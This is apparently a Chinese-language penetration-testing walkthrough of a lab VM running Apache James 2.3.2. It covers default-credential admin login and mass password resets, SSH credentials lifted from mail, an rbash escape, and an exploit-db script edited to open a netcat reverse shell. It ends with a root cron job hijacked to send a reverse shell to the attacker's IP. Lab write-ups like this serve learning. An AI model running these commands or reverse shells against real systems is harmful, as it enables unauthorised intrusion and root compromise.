
# mynew
Apache James Server 2.3.2 - Remote Command Execution
rbash逃逸
corn提权


# 
VMware双击打开，默认nat模式即可！

1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.185)


2、nmap 192.168.253.185 -p- -A
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp        JAMES smtpd 2.3.2
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2

nmap发现了22（ssh）、25（smtp）、80（http）、110（pop3）、119（nntp）、4555（admin）端口是开放的，4555还是james-admin JAMES Remote Admin 2.3.2，存在漏洞：

Apache James Server 2.3.2 - Remote Command Execution：
https://www.exploit-db.com/exploits/35513


3、JAMES Remote Admin 2.3.2匿名枚举
James Remote Administration的默认用户名密码是root/root


nc 192.168.253.185 4555
root
root
输入成功登录，开始枚举！


listusers   ---显示现有帐户
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin

发现五个账号信息！还能执行setpassword [username] [password]  重置密码
全部修改为dayu！

setpassword james dayu
setpassword thomas dayu
setpassword john dayu
setpassword mindy dayu
setpassword mailadmin dayu

现在有了pop3的用户名密码，进去看看！


4、JAMES pop3d 2.3.2渗透

telnet 192.168.253.185 110
user mindy
pass dayu
成功登录！

list 
retr 1

------------------
Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.
------------------
在第二封邮件发现信息，可以看到James从管理员帐户向Mindy 发送了邮件，并共享了他的SSH登录凭据，在mindy用户邮件中看到了账号密码

用户名密码：
username: mindy
pass: P@55W0rd1!2@


5、内部信息枚举

ssh mindy@192.168.253.185
P@55W0rd1!2@

发现是一个rbash（限制型bash），是平时所谓的 restricted shell的一种，也是最常见的 restricted shell（rbash、ksh、rsh等）
rbash逃逸大全：https://xz.aliyun.com/t/7642


james:x:1000:1000:james:/home/james/:/bin/bash
mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash

可以看到/bin/rbash的shell，限制很大！

ssh mindy@192.168.253.185 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"


6、JAMES Remote Admin 2.3.2 webshell

locate linux/remote/35513.py
cp /usr/share/exploitdb/exploits/linux/remote/35513.py .

打开payload：
19行改动下：nc -e /bin/sh 192.168.253.138 1234

nc -vlp 1234
ssh mindy@192.168.253.185
P@55W0rd1!2@



7、提权

前面能进入mindy用户是通过James那里得到的提示，james发了邮件给mindy，这边我查看下james运行过程：
ps aux | grep james

root       411  0.0  0.1   2332   600 ?        Ss   Mar29   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh

find  / -writable 2>/dev/null


echo 'import os; os.system("/bin/nc 192.168.253.138 6666 -e /bin/bash")' > /opt/tmp.py

echo "os.system('/bin/nc -e /bin/bash 192.168.253.138 6666')" >> tmp.py




拓展小技巧：

xargs：
https://www.runoob.com/linux/linux-comm-xargs.html

find / -type f | xargs grep tmp.py
/var/spool/cron/crontabs/root:*/3 * * * * python /opt/tmp.py

可看到每3分钟执行一次！











































































































































